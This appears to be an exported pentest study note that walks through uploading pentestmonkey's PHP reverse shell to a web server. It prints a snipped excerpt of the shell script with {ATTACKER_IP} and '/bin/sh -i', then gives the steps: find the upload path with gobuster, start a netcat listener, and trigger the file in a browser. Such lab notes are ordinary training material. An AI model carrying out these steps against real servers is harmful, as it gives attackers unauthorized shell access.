<!doctype html>
<html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>php reverse shell</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles4.css" type="text/css" />
</head>
<body>
<div class='page'><h1 class='title'>php reverse shell</h1><br/>It is possible to find webshells under the folder /usr/share/webshells/ , however, if you<br />don&#39;t have it, you can download it from below:<br /><br /><a href="https://github.com/BlackArch/webshells">https://github.com/BlackArch/webshells</a><br /><br /><br />For this exercise we are going to use the /usr/share/webshells/php/php-reverse-shell.php.<br /><br /><br />&lt;?php<br />// php-reverse-shell - A Reverse Shell implementation in PHP<br />// Copyright (C) 2007 pentestmonkey@pentestmonkey.net<br />//<br />// This tool may be used for legal purposes only.<br />// for any actions performed using this tool.<br />// for damage caused by this tool.<br />Users take full responsibility<br />The author accepts no liability<br />If these terms are not acceptable to you, then<br />// do not use this tool.<br />//<br />&lt;SNIP&gt;<br />set_time_limit (0);<br />$VERSION = &quot;1.0&quot;;<br />$ip = &#39;127.0.0.1&#39;; // CHANGE THIS WITH YOUR IP {ATTACKER_IP}<br />$port = 1234; // CHANGE THIS WITH YOUR LISTENING PORT {ATTACKER_PORT}<br />$chunk_size = 1400;<br />$write_a = null;<br />$error_a = null;<br />$shell = &#39;uname -a; w; id; /bin/sh -i&#39;;<br />$daemon = 0;<br />$debug = 0;<br />&lt;SNIP&gt;<br />?&gt;<br /><br />Of course we need to modify the above code so it can suit our needs. We are going to change the <strong>$ip</strong> and<br />the <strong>$port</strong> variables to match our settings and then we will attempt to upload the file.<br /><br />1. Find a way to upload the php file and run it as below:<br />2. Finding upload location is done using gobuster with -x flag for php files.<br /><br />Run netcat listener in Attacker machine.<br /><br />Then in the web browser run the php file using the path found.<br />http://{TARGET_IP}/uploads/php-reverse-shell.php</div>
</body>
</html>
